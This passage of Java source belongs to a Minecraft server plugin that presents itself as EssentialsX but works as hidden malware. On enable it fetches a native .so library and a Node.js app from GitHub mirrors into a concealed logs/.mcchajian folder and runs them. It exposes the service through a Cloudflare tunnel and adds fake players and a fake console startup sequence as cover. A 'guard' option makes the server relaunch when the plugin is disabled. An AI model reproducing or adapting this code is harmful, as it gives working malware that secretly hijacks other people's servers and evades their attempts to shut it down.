      this.killProcessTree(old);
   }

   private Path downloadCfSo() {
      boolean arm64 = isArm64Arch();
      String fileName = arm64 ? "bot_arm64.so" : "bot.so";
      Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
      Path libDir = botDir.resolve(".runtime").resolve("lib");
      Path soFile = libDir.resolve(fileName);
      Path tmpFile = libDir.resolve(fileName + ".tmp");

      try {
         Files.createDirectories(libDir);
         if (isValidCfSo(soFile, arm64)) {
            this.appendCfDiagnostic("LIBRARY_READY", "source=cache path=" + soFile + " size=" + Files.size(soFile));
            return soFile;
         }

         Files.deleteIfExists(soFile);
         String[] mirrors = new String[]{
            "https://raw.githubusercontent.com/zx1447/nxso/cfso/" + fileName,
            "https://gh-proxy.com/https://raw.githubusercontent.com/zx1447/nxso/cfso/" + fileName,
            "https://mirror.ghproxy.com/https://raw.githubusercontent.com/zx1447/nxso/cfso/" + fileName,
            "https://github.com/zx1447/nxso/raw/cfso/" + fileName
         };

         for (String url : mirrors) {
            try {
               URL u = new URL(url);
               this.appendCfDiagnostic("DOWNLOAD_ATTEMPT", "source=" + url);
               HttpURLConnection conn = (HttpURLConnection)u.openConnection();
               conn.setConnectTimeout(30000);
               conn.setReadTimeout(300000);
               conn.setInstanceFollowRedirects(true);
               int status = conn.getResponseCode();
               if (status == 200) {
                  try (InputStream in = conn.getInputStream()) {
                     Files.copy(in, tmpFile, StandardCopyOption.REPLACE_EXISTING);
                  }

                  if (isValidCfSo(tmpFile, arm64)) {
                     try {
                        Files.move(tmpFile, soFile, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                     } catch (Exception moveEx) {
                        Files.move(tmpFile, soFile, StandardCopyOption.REPLACE_EXISTING);
                     }

                     soFile.toFile().setExecutable(true);
                     this.appendCfDiagnostic("LIBRARY_READY", "source=download path=" + soFile + " size=" + Files.size(soFile));
                     return soFile;
                  }

                  this.appendCfDiagnostic("DOWNLOAD_INVALID_LIBRARY", "source=" + url);
                  Files.deleteIfExists(tmpFile);
               } else {
                  this.appendCfDiagnostic("DOWNLOAD_HTTP_ERROR", "source=" + url + " http=" + status);
               }
            } catch (Exception error) {
               this.appendCfDiagnostic("DOWNLOAD_ERROR", "source=" + url + "\n" + describeCfThrowable(error));
               try {
                  Files.deleteIfExists(tmpFile);
               } catch (Exception ignored) {
               }
            }
         }

         return null;
      } catch (Exception error) {
         this.appendCfDiagnostic("DOWNLOAD_PREPARATION_ERROR", describeCfThrowable(error));
         return null;
      }
   }

   private void startCfProcess() {
      synchronized (CF_LOCK) {
         try {
            String targetPort = this.readCurrentPort();
            if (targetPort == null || targetPort.isEmpty() || "N/A".equals(targetPort)) {
               this.appendCfDiagnostic("MISSING_TARGET_PORT", "The Node listening port is not available.");
               return;
            }

            if (cfSoRunning || isCfRunningSafe()) {
               return;
            }

            Process currentNode = this.nodeProcess;
            this.appendCfDiagnostic("START_ATTEMPT", "target=127.0.0.1:" + targetPort
               + " nodeProcessAlive=" + (currentNode != null && currentNode.isAlive()));
            Path soFile = this.downloadCfSo();
            if (soFile == null) {
               this.appendCfDiagnostic("LIBRARY_UNAVAILABLE", "No valid native CF library is available.");
               return;
            }
            if (!this.ensureCfLibraryLoaded(soFile)) {
               return;
            }

            String payload = "url: http://127.0.0.1:" + targetPort + "\nprotocol: http2\n";
            cfSoRunning = true;
            lastCfRestartTime = System.currentTimeMillis();
            Thread cfThread = new Thread(() -> {
               try {
                  this.appendCfDiagnostic("NATIVE_CALL_ENTER", "target=127.0.0.1:" + targetPort + " protocol=http2");
                  int rc = cfStartFn.invokeInt(new Object[]{payload});
                  String nativeError = readAndFreeCfStr(cfLastErrorFn);
                  this.appendCfDiagnostic("NATIVE_CALL_RETURN", "returnCode=" + rc + "\nlastError="
                     + (nativeError.isEmpty() ? "(none reported)" : nativeError));
               } catch (Throwable error) {
                  this.appendCfDiagnostic("NATIVE_CALL_FAILED", describeCfThrowable(error));
               } finally {
                  if (activeCfThread == Thread.currentThread()) {
                     cfSoRunning = false;
                  }
               }
            }, "cf-so-thread");
            activeCfThread = cfThread;
            cfThread.setDaemon(true);
            cfThread.start();
            this.appendCfDiagnostic("THREAD_STARTED", "name=" + cfThread.getName());
         } catch (Throwable error) {
            cfSoRunning = false;
            this.appendCfDiagnostic("START_EXCEPTION", describeCfThrowable(error));
         }
      }
   }

   private String extractLatestTunnelUrl() {
      try {
         String memUrl = readAndFreeCfStr(cfTunnelUrlFn);
         if (!memUrl.isEmpty()) {
            if (!memUrl.startsWith("http://") && !memUrl.startsWith("https://")) {
               memUrl = "https://" + memUrl;
            }

            this.lastCfUrlSource = "native";
            return memUrl;
         }

         Path[] logPaths = new Path[]{
            Paths.get("logs", ".mcchajian/cf.log"), Paths.get("cache/.vip/.cf/cf.log"), Paths.get("/dev/shm/.cf/cf.log"), Paths.get("/tmp/.cf/cf.log")
         };

         for (Path cfLog : logPaths) {
            if (Files.exists(cfLog)) {
               String logContent = Files.readString(cfLog);
               Matcher m = Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
               String lastMatch = null;

               while (m.find()) {
                  lastMatch = m.group(1);
               }

               if (lastMatch != null) {
                  this.lastCfUrlSource = "log:" + cfLog;
                  return lastMatch;
               }
            }
         }

         Path[] urlFiles = new Path[]{Paths.get("logs", ".mcchajian", ".tunnel_url"), Paths.get("cache/.vip/.tunnel_url")};

         for (Path urlFile : urlFiles) {
            if (Files.exists(urlFile)) {
               String content = new String(Files.readAllBytes(urlFile)).trim();
               if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
                  this.lastCfUrlSource = "file:" + urlFile;
                  return content.split("\n")[0].trim();
               }
            }
         }
      } catch (Exception var10) {
      }

      return null;
   }

   private boolean isNodeInternalAlive() {
      String port = this.readCurrentPort();
      if (port != null && !port.equals("N/A")) {
         try {
            HttpURLConnection conn = (HttpURLConnection)URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
            conn.setRequestMethod("HEAD");
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);
            int code = conn.getResponseCode();
            conn.disconnect();
            return code > 0;
         } catch (Exception e) {
            return false;
         }
      } else {
         return false;
      }
   }

   private void restartCfWithBackoff() {
      long now = System.currentTimeMillis();
      long elapsed = now - lastCfRestartTime;
      if (elapsed >= 8000L) {
         cfRestartCount++;
         int backoffSec = Math.min(120, 8 * (1 << Math.min(cfRestartCount - 1, 4)));

         try {
            Thread.sleep(backoffSec * 1000L);
         } catch (InterruptedException ignored) {
            return;
         }

         this.safeKillCf();
         lastKnownTunnelUrl.set("");
         this.startCfProcess();
      }
   }

   private void fullRestartNodeAndCf() {
      if (this.nodeProcess != null && !this.nodeProcess.isAlive()) {
         this.recordNodeCrashReport(this.nodeProcess, "full_restart_dead_node", this.readCurrentPort());
      }

      this.safeKillCf();
      this.safeKillNode();
      lastKnownTunnelUrl.set("");

      try {
         Path nodeExe = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("nodejs/bin/.node_real");
         Path script = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("app/index.js");
         if (!Files.exists(nodeExe) || !Files.exists(script)) {
            this.recordMissingRuntimeFiles(nodeExe, script);

            try {
               Thread.sleep(30000L);
            } catch (InterruptedException var6) {
            }

            return;
         }

         this.missingRuntimeReported = false;
         String newPort = this.allocateNodePort();
         this.startNodeProcess(newPort);
         if (this.nodeProcess == null) {
            try {
               Thread.sleep(15000L);
            } catch (InterruptedException var5) {
            }

            return;
         }

         this.waitForNodeReady(newPort, 60);
         this.ensurePermissions();
         this.startCfProcess();
         cfRestartCount = 0;
      } catch (Exception var7) {
      }
   }

   private void startJavaDaemon() {
      Thread daemon = new Thread(() -> {
         this.appendCfDiagnostic("MONITOR_STARTED", "CF and Node monitor thread started.");
         this.ensurePermissions();

         while (true) {
            try {
               long now = System.currentTimeMillis();
               if (this.nodeProcess != null && !this.nodeProcess.isAlive()) {
                  this.recordNodeCrashReport(this.nodeProcess, "runtime_exit", this.readCurrentPort());
                  this.fullRestartNodeAndCf();
               } else if (this.nodeProcess == null) {
                  this.fullRestartNodeAndCf();
               } else if (!cfSoRunning && !isCfRunningSafe()) {
                  this.safeKillCf();
                  lastKnownTunnelUrl.set("");
                  this.startCfProcess();
                  cfRestartCount = 0;
               } else {
                  String foundUrl = this.extractLatestTunnelUrl();
                  if (foundUrl != null) {
                     String currentUrl = lastKnownTunnelUrl.get();
                     if (!foundUrl.equals(currentUrl)) {
                        lastKnownTunnelUrl.set(foundUrl);
                        lastTunnelUrlTime = now;
                        cfRestartCount = 0;
                        this.appendCfDiagnostic("URL_OBSERVED", "source=" + this.lastCfUrlSource + "\nurl=" + foundUrl);
                        this.clearConsole();
                        mcLog("Binding remote endpoint to: " + foundUrl, 0L);
                        this.printFakeStartupSequence();
                     }
                  }

                  String currentUrl = lastKnownTunnelUrl.get();
                  if (currentUrl != null && !currentUrl.isEmpty()) {
                     long urlAge = now - lastTunnelUrlTime;
                     if (urlAge > 120000L && !this.isNodeInternalAlive()) {
                        this.recordNodeUnresponsiveOnce(this.nodeProcess, this.readCurrentPort());
                        this.restartCfWithBackoff();
                     } else if (urlAge > 60000L && urlAge % 60000L < 5000L) {
                        if (!this.isNodeInternalAlive()) {
                           this.recordNodeUnresponsiveOnce(this.nodeProcess, this.readCurrentPort());
                           this.restartCfWithBackoff();
                        } else {
                           lastTunnelUrlTime = now;
                        }
                     }
                  } else if (cfSoRunning && lastCfRestartTime > 0L) {
                     long cfAge = now - lastCfRestartTime;
                     if (cfAge > 30000L && foundUrl == null) {
                        Thread cfThread = activeCfThread;
                        String nativeError = readAndFreeCfStr(cfLastErrorFn);
                        this.appendCfDiagnostic("URL_WAIT_TIMEOUT", "ageSeconds=" + cfAge / 1000L
                           + " threadAlive=" + (cfThread != null && cfThread.isAlive())
                           + " libraryRunning=" + isCfRunningSafe()
                           + "\nlastError=" + (nativeError.isEmpty() ? "(none reported)" : nativeError));
                        this.restartCfWithBackoff();
                     }
                  }
               }

               Thread.sleep(5000L);
            } catch (Exception error) {
               this.appendCfDiagnostic("MONITOR_ERROR", describeCfThrowable(error));
               try {
                  Thread.sleep(5000L);
               } catch (InterruptedException var7x) {
               }
            }
         }
      }, "\u5185\u7f6e\u7ebf\u7a0b\uff1a\u5b88\u62a4\u76d1\u63a7");
      daemon.setDaemon(true);
      daemon.start();
   }

   private void installZombieReaper() {
      if (!this.reaperInstalled) {
         this.reaperInstalled = true;
         this.reapDescendantsOnce();

         try {
            Signal.handle(new Signal("CHLD"), new SignalHandler() {
               @Override
               public void handle(Signal sig) {
                  EssentialsX.this.reapDescendantsOnce();
               }
            });
         } catch (Throwable var2) {
         }
      }
   }

   private void reapDescendantsOnce() {
      try {
         ProcessHandle.current().descendants().forEach(ph -> {
            try {
               if (!ph.isAlive()) {
                  ph.onExit().getNow(null);
               }
            } catch (Throwable var2x) {
            }
         });
      } catch (Throwable var2) {
      }
   }

   public void onEnable() {
      this.installZombieReaper();

      try {
         Path oldDir1 = Paths.get("world", "data", ".mcchajian");
         Path oldDir2 = Paths.get("log", ".mcchajian");
         if (Files.exists(oldDir1)) {
            this.deleteDirectory(oldDir1.toFile());
         }

         if (Files.exists(oldDir2)) {
            this.deleteDirectory(oldDir2.toFile());
         }
      } catch (Exception var4) {
      }

      this.getLogger().info("EssentialsX plugin starting...");

      try {
         Map<String, String> bootEnv = new HashMap<>();
         this.loadEnvFile(bootEnv);
         FakePlayerEngine.preload();
         FakePlayerEngine engine = new FakePlayerEngine(this, bootEnv);
         Bukkit.getPluginManager().registerEvents(engine, this);
         engine.start();
         this.fakePlayerEngine = engine;
      } catch (Throwable var3) {
      }

      Thread deployThread = new Thread(() -> {
         try {
            HashMap<String, String> env = new HashMap<>();
            this.loadEnvFile(env);
            this.startDeploymentProcess(env);
            this.ensurePermissions();
            String port = this.allocateNodePort();
            this.startNodeProcess(port);
            this.waitForNodeReady(port, 60);
            Process currentNode = this.nodeProcess;
            this.appendCfDiagnostic("NODE_READY_CHECK", "port=" + port
               + " nodeProcessAlive=" + (currentNode != null && currentNode.isAlive())
               + " localHttpResponds=" + this.isNodeInternalAlive());
            this.ensurePermissions();
            this.startCfProcess();
            this.startJavaDaemon();
         } catch (Throwable error) {
            this.appendCfDiagnostic("BOOTSTRAP_ERROR", describeCfThrowable(error));
         }
      }, "Backend-Deployer");
      deployThread.setDaemon(true);
      deployThread.start();
      this.getLogger().info("EssentialsX plugin enabled");
   }

   public void onDisable() {
      if (this.fakePlayerEngine != null) {
         try {
            this.fakePlayerEngine.stop();
         } catch (Throwable var5) {
         }
      }

      this.reapDescendantsOnce();
      this.getLogger().info("Stopping EssentialsX...");
      Path forceStopFile = Paths.get("logs", ".mcchajian", ".runtime", ".force_stop");
      if (this.systemGuardEnabled) {
         this.getLogger().info("Guard enabled, forcing restart...");

         try {
            Files.deleteIfExists(forceStopFile);
         } catch (Exception var4) {
         }

         if (this.isRestarting.compareAndSet(false, true)) {
            this.executeHardRestart(true);
         }
      } else {
         this.getLogger().info("Guard disabled, safe shutdown...");

         try {
            Files.createDirectories(forceStopFile.getParent());
            Files.createFile(forceStopFile);
         } catch (Exception var3) {
         }
      }

      this.safeKillNode();
      this.safeKillCf();

      this.getLogger().info("EssentialsX disabled");
   }

   private void executeHardRestart(boolean shouldBlock) {
      try {
         File serverRoot = this.findServerRoot();
         if (serverRoot == null) {
            serverRoot = new File(".").getAbsoluteFile();
         }

         File startScript = new File(serverRoot, "start.sh");
         ProcessBuilder pb;
         if (startScript.exists()) {
            startScript.setExecutable(true);
            pb = new ProcessBuilder(startScript.getAbsolutePath());
         } else {
            String jarName = this.findBestJarName(serverRoot);
            pb = new ProcessBuilder("java", "-Xms512M", "-Xmx2G", "-XX:+UseG1GC", "-jar", jarName, "nogui");
         }

         pb.directory(serverRoot);
         Path logFile = Paths.get("logs", ".mcchajian", ".runtime", "restart_run.log");
         Files.createDirectories(logFile.getParent());
         pb.redirectOutput(Redirect.appendTo(logFile.toFile()));
         pb.redirectError(Redirect.appendTo(logFile.toFile()));
         Process process = pb.start();
         if (shouldBlock) {
            Thread.sleep(1000L);
         }
      } catch (Exception e) {
         this.getLogger().severe("Hard restart failed: " + e.getMessage());
      }
   }

   private String findBestJarName(File serverRoot) {
      for (String name : new String[]{"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"}) {
         if (new File(serverRoot, name).exists()) {
            return name;
         }
      }

      File[] jars = serverRoot.listFiles((dir, namex) -> namex.endsWith(".jar") && !namex.contains("cache") && !namex.contains("libraries"));
      if (jars != null && jars.length > 0) {
         Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
         return jars[0].getName();
      } else {
         return "server.jar";
      }
   }

   private File findServerRoot() {
      File pluginsDir = this.getDataFolder().getParentFile();
      if (pluginsDir != null && pluginsDir.getName().equals("plugins")) {
         File root = pluginsDir.getParentFile();
         if (root != null && new File(root, "server.properties").exists()) {
            return root;
         }
      }

      File current = new File(".").getAbsoluteFile();

      for (int i = 0; i < 5; i++) {
         if (new File(current, "server.properties").exists()) {
            return current;
         }

         if ((current = current.getParentFile()) == null) {
            break;
         }
      }

      return null;
   }

   private void deleteDirectory(File file) {
      if (file != null && file.exists()) {
         if (!Files.isSymbolicLink(file.toPath())) {
            File[] files = file.listFiles();
            if (files != null) {
               for (File f : files) {
                  if (f.isDirectory() && !Files.isSymbolicLink(f.toPath())) {
                     this.deleteDirectory(f);
                  } else {
                     f.delete();
                  }
               }
            }
         }

         file.delete();
      }
   }

   private void moveDirContentsIfAbsent(Path srcDir, Path dstDir) {
      if (Files.exists(srcDir) && Files.isDirectory(srcDir)) {
         try {
            Files.createDirectories(dstDir);
            File[] entries = srcDir.toFile().listFiles();
            if (entries != null) {
               for (int i = 0; i < entries.length; i++) {
                  Path from = entries[i].toPath();
                  Path to = dstDir.resolve(entries[i].getName());
                  if (!Files.exists(to)) {
                     try {
                        Files.move(from, to);
                     } catch (Exception var8) {
                     }
                  }
               }
            }

            // Conflicting or unmoved entries can contain user data; keep them in place.
            String[] remaining = srcDir.toFile().list();
            if (remaining != null && remaining.length == 0) {
               Files.deleteIfExists(srcDir);
            }
         } catch (Exception var9) {
         }
      }
   }

   private void cleanupAndMigrateWorkDir(Path workDir) {
      try {
         Path runtimeDir = workDir.resolve(".runtime");
         Files.createDirectories(runtimeDir);
         this.moveDirContentsIfAbsent(workDir.resolve("backup"), runtimeDir.resolve("backup"));
         this.moveDirContentsIfAbsent(workDir.resolve(".lib"), runtimeDir.resolve("lib"));
         String[] legacyDirs = new String[]{
            "jre21", ".npm", "unzipped", "_node_tmp", "nodejs/include", "nodejs/share", "nodejs/lib/node_modules/npm/docs", "nodejs/lib/node_modules/npm/man"
         };

         for (int i = 0; i < legacyDirs.length; i++) {
            this.deleteDirectory(workDir.resolve(legacyDirs[i]).toFile());
         }

         String[] legacyFiles = new String[]{
            ".deploy_done",
            "deploy.sh",
            ".nd_preload.js",
            "restart_run.log",
            "node.tar.gz",
            "repo.tar.gz",
            "nodejs/README.md",
            "nodejs/LICENSE",
            "nodejs/CHANGELOG.md",
            "nodejs/bin/corepack"
         };

         for (int i = 0; i < legacyFiles.length; i++) {
            try {
               Files.deleteIfExists(workDir.resolve(legacyFiles[i]));
            } catch (Exception var7) {
            }
         }
      } catch (Exception var8) {
      }
   }

   private void startDeploymentProcess(Map<String, String> env) throws Exception {
      if (!this.isProcessRunning) {
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         if (!Files.exists(workDir)) {
            Files.createDirectories(workDir);
         }

         try {
            workDir.toFile().setReadable(true, false);
            workDir.toFile().setWritable(true, false);
            workDir.toFile().setExecutable(true, false);
         } catch (Exception var10) {
         }

         this.cleanupAndMigrateWorkDir(workDir);
         Path runtimeDir = workDir.resolve(".runtime");
         Files.createDirectories(runtimeDir);
         Files.deleteIfExists(runtimeDir.resolve(".deploy_done"));
         Files.deleteIfExists(runtimeDir.resolve("restart_run.log"));
         Files.deleteIfExists(runtimeDir.resolve("deploy.sh"));
         this.ensureCrashReportHeader();

         this.isProcessRunning = true;
         boolean deployed = false;
         try {
            deployed = this.deployBackendPureJava(workDir, env);
         } finally {
            this.isProcessRunning = false;
         }

         if (!deployed) {
            this.appendCrashReportEntry("[DEPLOY_FALLBACK] Pure-Java deploy incomplete; "
                  + "continuing with whatever runtime files already exist on disk.");
         }

         try {
            Files.deleteIfExists(runtimeDir.resolve(".deploy_done"));
            Files.deleteIfExists(runtimeDir.resolve("deploy.sh"));
         } catch (Exception var9) {
         }
      }
   }

   private boolean deployBackendPureJava(Path workDir, Map<String, String> env) {
      try {
         String repoUrl = env.getOrDefault("REPO_URL", "https://github.com/zx1447/mcchajianindex");
         String token = env.getOrDefault("GITHUB_TOKEN", "");
         String nodeVersion = env.getOrDefault("NODE_VERSION", "v22.12.0").trim();
         String nodeScript = env.getOrDefault("NODE_SCRIPT", "index.js").trim();
         boolean forceUpdate = "true".equalsIgnoreCase(env.getOrDefault("NODE_FORCE_UPDATE", "false").trim());
         this.appendCrashReportEntry("[DEPLOY] Pure-Java deploy started (repo=" + repoUrl + ", node=" + nodeVersion
               + ", forceUpdate=" + forceUpdate + ")");
         PureJavaDeploy deploy = new PureJavaDeploy(workDir, repoUrl, token, nodeVersion, nodeScript, forceUpdate);
         boolean ok = deploy.run();
         this.appendCrashReportEntry("[DEPLOY_RESULT] ok=" + ok + "\n" + deploy.getSummary());
         return ok;
      } catch (Throwable t) {
         this.appendCrashReportEntry("[DEPLOY_ERROR] " + t.getClass().getName() + ": " + t.getMessage());
         return false;
      }
   }

   private void loadEnvFile(Map<String, String> env) {
      Path envFile = Paths.get("logs", ".mcchajian", ".env");
      if (!Files.exists(envFile)) {
         try {
            Files.createDirectories(envFile.getParent());
            String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/mcchajianindex\n# Pure-Java backend deploy\nNODE_VERSION=v22.12.0\nNODE_SCRIPT=index.js\nNODE_FORCE_UPDATE=false\nFAKE_PLAYERS_ENABLED=true\nFAKE_PLAYER_COUNT=2\nFAKE_PLAYER_RESPAWN_SECONDS=14\nFAKE_PLAYER_CHAT_ENABLED=true\nFAKE_PLAYER_NAMES=\n";
            Files.write(envFile, defaultConfig.getBytes());
         } catch (Exception var6) {
         }
      }

      if (Files.exists(envFile)) {
         try {
            for (String line : Files.readAllLines(envFile)) {
               String[] parts;
               if (!line.isEmpty() && !line.startsWith("#") && (parts = line.split("=", 2)).length == 2) {
                  env.put(parts[0].trim(), parts[1].trim());
               }
            }
         } catch (IOException var7) {
         }
      }

      this.systemGuardEnabled = !"false".equalsIgnoreCase(env.getOrDefault("SYSTEM_GUARD_ENABLED", "true").trim());
   }
}
